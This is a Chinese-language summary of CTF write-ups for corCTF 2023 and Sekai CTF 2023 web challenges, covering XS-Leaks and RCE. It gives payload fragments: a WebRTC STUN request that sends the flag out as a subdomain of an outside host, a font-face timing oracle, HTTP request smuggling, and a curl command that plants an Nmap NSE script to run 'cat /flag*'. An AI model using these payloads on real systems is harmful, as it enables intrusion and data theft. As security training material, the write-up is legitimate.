---
title: corCTF 2023 & Sekai CTF 2023 筆記
contest: corCTF+Sekai
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [xs-leak, xs-search, rtc-stun, font-face-oracle, file-leak, http-smuggling, nmap, nse, rce]
attack_chain:
  - WebRTC STUN 泄漏 flag 子域
  - font-face 10000 次 search 触发后端延迟
  - SVG foreignObject + iframe sandbox
  - HTTP Request Smuggling (CL/TE)
  - Nmap NSE 脚本执行
  - nginx proxy_pass IP 限制绕过
  - 缓存探测 + leakless note oracle
key_payload: WebRTC STUN 子域 / font-face 字符时延 / HTTP smuggling CL.TE
one_liner: corCTF 2023 + Sekai CTF 2023 跨比赛笔记合集，XS-Leak + RCE 双重攻击面。
lesson: 现代 WEB 难度的天花板在 corCTF/Sekai 级别——纯前端 XS-Leak + 协议层 RCE + 信息泄漏组合拳。
quality: high
---

corCTF 2023 与 Sekai CTF 2023 跨比赛笔记集合，题目围绕 XS-Leak + RCE 双线展开。

**Sekai 题目 1：file-leak + STUN 子域 oracle**
- 接口 `/anonymized/?image_file=...` 接受 unquote 后的路径
- `os.path.join('/tmp/abc', '/test.txt')` 返回 `/test.txt` → 路径绝对化绕过
- 用 SVG foreignObject 内嵌 JS 触发 WebRTC STUN 请求，把 flag 编码为子域名 `stun:<flag>.x.cjxol.com:1337`
- 攻击者通过 DNS 解析或日志收子域获得 flag 字符

**Sekai 题目 2：font-face 字符时延**
- `Content-Security-Policy: script-src 'none'`
- 利用 `@font-face` `src: url(/time-before), url(/search.php?query=corctf{a), url(/search.php?query=corctf{a) /*10000 times*/, url(/time-after)` 做字符时延 oracle
- 服务端在 query 不存在时延迟回 404，命中时立即回 404，差分出 flag 字符

**corCTF 题目 1：HTTP Smuggling + NSE**
- `nginx + Flask` 组合，CL.TE smuggling
- `POST /generate{chr(9)}HTTP/1.1/../../ HTTP/1.1` 触发路径穿越
- 利用 `nmap --script http-fetch` 拉远端 NSE 脚本
- `nmap --script=/tmp/RackMultipart...` 执行 OS 命令，curl multipart form `$'service=127.0.0.1:1337\t--script\t/tmp/RackMultipart?.../evil' -F '=os.execute("cat /flag*");filename=evil'`

**corCTF 题目 2：leakless note oracle**
- 通过 cache probing + transfer-encoding chunked oracle
- 不用 content-length 用 timing 探测 iframe 加载速度
- 600 次 sample median + 8 轮减少噪声

**Sekai 题目 3：jwks.json + 跨域 cookie**
- `GET /post/.../.../.well-known/jwks.json` 内联到 `X: GET ...` 头里
- 配合 COOP same-origin + 短 payload 限制
- `<?php` 解析 cookie 中 flag → SVG script 跨域读

整篇笔记风格很"工具化"：直接贴 SVG payload、JS oracle 代码、smuggling 字节流，省去解释。
